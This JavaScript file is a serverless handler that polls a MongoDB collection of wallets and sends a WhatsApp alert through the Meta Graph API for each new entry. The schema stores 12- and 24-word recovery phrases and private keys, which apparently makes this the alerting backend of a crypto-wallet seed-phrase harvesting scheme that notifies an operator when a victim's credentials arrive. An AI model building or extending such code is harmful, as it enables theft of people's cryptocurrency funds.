import { connect, model, Schema } from 'mongoose';
import axios from 'axios';

const mongoURI = process.env.MONGO_URI;
const token = process.env.META_API_TOKEN;
const recipient = process.env.WHATSAPP_RECIPIENT;

let lastChecked = new Date();

connect(mongoURI);

const WalletSchema = new Schema({
  walletName: String,
  walletAddress: String,
  phraseWords: [String],
  phraseWords24: [String],
  privateKey: String,
}, { timestamps: true });

const Wallet = model('Wallet', WalletSchema);

export default async function handler(req, res) {
  if (req.headers['authorization'] !== `Bearer ${process.env.CRON_SECRET}`) {
    return res.status(401).end('Unauthorized');
  }

  try {
    const newEntries = await Wallet.find({ createdAt: { $gt: lastChecked } });

    if (newEntries.length > 0) {
      for (const entry of newEntries) {
        await sendWhatsAppMessage(entry.walletName);
      }
      lastChecked = new Date();
    }

    res.status(200).send('Check complete.');
  } catch (error) {
    console.error('Error checking for new entries:', error);
    res.status(500).send('Error checking for new entries.');
  }
}

async function sendWhatsAppMessage(walletName) {
  try {
    const response = await axios.post(
      'https://graph.facebook.com/v20.0/439660965887093/messages',
      {
        messaging_product: 'whatsapp',
        to: recipient,
        type: 'template',
        template: {
          name: 'hello_world',
          language: { code: 'en_US' },
          components: [
            {
              type: 'body',
              parameters: [
                { type: 'text', text: `New wallet added: ${walletName}` }
              ]
            }
          ]
        }
      },
      {
        headers: {
          Authorization: `Bearer ${token}`,
          'Content-Type': 'application/json',
        },
      }
    );

    console.log('WhatsApp message sent:', response.data);
  } catch (error) {
    console.error('Error sending WhatsApp message:', error);
  }
}
